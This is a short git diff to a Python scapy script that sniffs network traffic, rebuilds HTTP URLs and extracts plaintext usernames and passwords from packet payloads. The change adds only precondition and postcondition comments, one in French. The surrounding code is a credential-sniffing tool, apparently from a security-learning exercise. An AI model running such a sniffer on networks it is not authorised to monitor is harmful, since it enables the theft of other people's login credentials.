@@ -13,12 +13,18 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
+# @ Requires a packet
+# @ ensures the recomposed url
+# @ raises nothing
 # url (packet.show shows that urls are in the layer HTTP)
 # they are made by the combine of the fields Host and Path
 def get_url(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
 
+# @ Requires a packet
+# @ ensures a plain text that contains login information
+# @ raises nothing
 def get_login_info(packet):
     # packet.show shows that passwords and ids are in the layer raw
     if packet.haslayer(scapy.Raw):
@@ -32,6 +38,9 @@ def get_login_info(packet):
                 return load
 
 
+# @ Requires a packet
+# @ ensures renvoie l'url et les informations sur le login 
+# @ raises nothing
 def process_sniffed_packet(packet):
     # if packet has a layer and the layer is an HTTP request
     if packet.haslayer(http.HTTPRequest):
